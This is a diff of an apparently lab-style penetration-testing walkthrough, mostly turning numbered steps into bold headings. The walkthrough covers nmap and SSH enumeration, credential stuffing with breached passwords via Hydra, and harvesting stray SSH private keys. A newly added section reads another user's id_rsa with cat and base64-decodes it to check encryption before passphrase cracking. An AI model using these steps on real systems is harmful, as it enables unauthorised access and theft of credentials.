@@ -21,7 +21,7 @@
 
 Steps
 
-1. Perform Active Scanning with NMAP.  
+**Perform Active Scanning with NMAP.**  
 Command:
 ```bash
 sudo nmap $ip -Pn -n -oA discScan
@@ -39,7 +39,7 @@ Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
 </PRE>
 ---
 
-2. Gather Host Information with SSH Debug Mode.  
+**Gather Host Information with SSH Debug Mode.**  
 Command:
 ```bash
 ssh -v $ip
@@ -75,7 +75,7 @@ debug1: Will attempt key: /home/not-root/.ssh/id_xmss
 
 ---
 
-What We Know
+**What We Know**
 
 - Open Ports: Port 22 (SSH) is open.
 - SSH Service Information:
@@ -88,14 +88,14 @@ What We Know
 
 ---
 
-What We Have
+**What We Have**
 
 - Personnel Roster: Names and potential user accounts.
 - Breached Credentials: Password list from previous breaches.
 
 ---
 
-What We Can Do
+**What We Can Do**
 
 - Craft a credential stuffing attack using breached credentials and the observed naming convention (f_last).
 
@@ -112,7 +112,7 @@ What We Can Do
 
 ### Steps
 
-1. **Crafting the Credential Stuffing Attack**
+**Crafting the Credential Stuffing Attack**
 
 Make a `users.txt` list which reflects the naming convention found on the SSH Banner:  
 Naming Convention: `f_lastName`
@@ -161,7 +161,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-05 01:50:
 
 ---
 
-2. **Gain Initial Foothold**
+**Gain Initial Foothold**
 
 Use the newly found credentials to gain access to the target and retrieve the user flag.    
 
@@ -202,7 +202,7 @@ Truncated Output:
 /home/sftp/uploads/.temp_keys/id_rsa_contractor1  
 /home/sftp/uploads/.temp_keys/id_rsa_audit  
 
-Additionally:  
+  
 -rw------- 1 sftp sftp_service 3435 Jan  3 01:56 /home/sftp/uploads/.temp_keys/id_rsa_barbara  
 </PRE>
 
@@ -235,6 +235,10 @@ Additionally:
 ---
 
 ### j_moore, Lateral Move to SFTP
+
+Steps:
+
+**Identify if the id_rsa is encrypted**
 
 Log into the SFTP service using j_moore's id_rsa:
 Command:  
@@ -270,6 +274,45 @@ Enter passphrase for key 'id_rsa':
 Before logging into the SFTP service, the passphrase for the id_rsa key must be cracked.
 
 ---
+
+<details>
+<summary>Alternate Method (Identify if the id_rsa is encrypted)</summary>
+
+### Steps
+
+#### Copy `j_moore`'s `id_rsa` to the Clipboard
+Use the following command to display the private key:
+```bash
+cat /home/j_moore/.ssh/id_rsa
+```
+Do **not** copy the header or footer of the key file. Example:
+- **Header:** `-----BEGIN OPENSSH PRIVATE KEY-----`
+- **Footer:** `-----END OPENSSH PRIVATE KEY-----`
+
+---
+
+#### Decode the `id_rsa`
+Decode the private key using `base64` to check if it is encrypted:
+```bash
+echo "contents of id_rsa" | base64 -d
+```
+
+---
+
+#### Example Output (truncated for brevity):
+```plaintext
+openssh-key-v1
+aes256-ctrbcrypt
+�i�0��]N%�#��Sssh-rsa��'�+���#:,�}��v�;z�*/f�����[�`�Z8\�w�
+```
+
+---
+
+### Analysis
+If the output lists `aes256-ctrbcrypt` (or similar encryption), the key is passphrase-protected and encrypted.
+
+</details>
+
 
 #### Cracking SSH Passphrases
 
